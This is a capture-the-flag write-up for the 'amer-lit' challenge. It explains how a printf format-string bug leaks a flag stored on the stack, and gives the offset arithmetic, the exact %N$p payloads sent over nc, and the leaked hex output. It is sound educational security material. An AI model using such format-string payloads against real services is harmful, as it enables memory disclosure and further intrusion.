## Challenge

> Writing essays is so much fun! Watch me write all these totally meaningful words about other words... Actually, wait. You shouldn't be reading my essays. Shoo!

## Solution

The challenge page provides us with a [binary](Backup/amer-lit) and the [C code](Backup/amer-lit.c) it was compiled from.

Reading through the code we noticed that this challenge would output whatever we write using printf, opening it up to a string format vulnerability. By constructing a string full of format specifiers we can leak values from the stack, and it just so happens to be that the flag is read into a buffer on the stack. To figure out where this buffer is located I loaded the binary up in [Ghidra](https://ghidra-sre.org/) to inspect the disassembled main function:

The flag is stored in local_78(rbp-0x70), to target specific arguments we can use the format `%2$p` where 2 is the index of the parameter we want to print. However, for our printf vulnerability we have to keep in mind that the first 6 parameters are stored in registers(RDI, RSI, RDX, RCX, R8, and R9), not on the stack. So to get to our flag we need to take 0x70 / 8 = 14 and add another 6 for the registers. This means the flag should start at `%20$p`. Due to our length constraint we can only fit 9 format specifiers in the input.

Connecting to the remote host with `nc bin.bcactf.com 49157` and entering `%20$p%21$p%22$p%23$p%24$p%25$p%26$p%27$p%28$p` gets us the following(split up for clarity)

> 
> 0x745f68636165725f
> 
> 0x69757165725f6568

Plugging this in to [CyberChef](https://gchq.github.io/CyberChef/) with Swap Endianness with 8 byte word size and From Hex as format results in:

It seems like we're still missing some bit, doing the same thing again with `%29$p%30$p%31$p%32$p%33$p%34$p%35$p%36$p%37$p` as input results in:
> 0x64726f775f646572
> 
> 0x6e5f74696d696c5f
> 
> 0x5f746f6e5f65706f
> 
> 0x7ffe007d656d
> 
> 0xb6676a39b64da300
> 
> (nil)
> 
> 0x7fb3bc82d0b3
> 
> 0x310x7ffe3add5258

in the middle of 0x7ffe007d656d is the \0 terminator that marks the end of the string, removing the unnecesary data results in the final block of hex data being

Which when plugged in to [CyberChef](https://gchq.github.io/CyberChef/) results in the full flag:
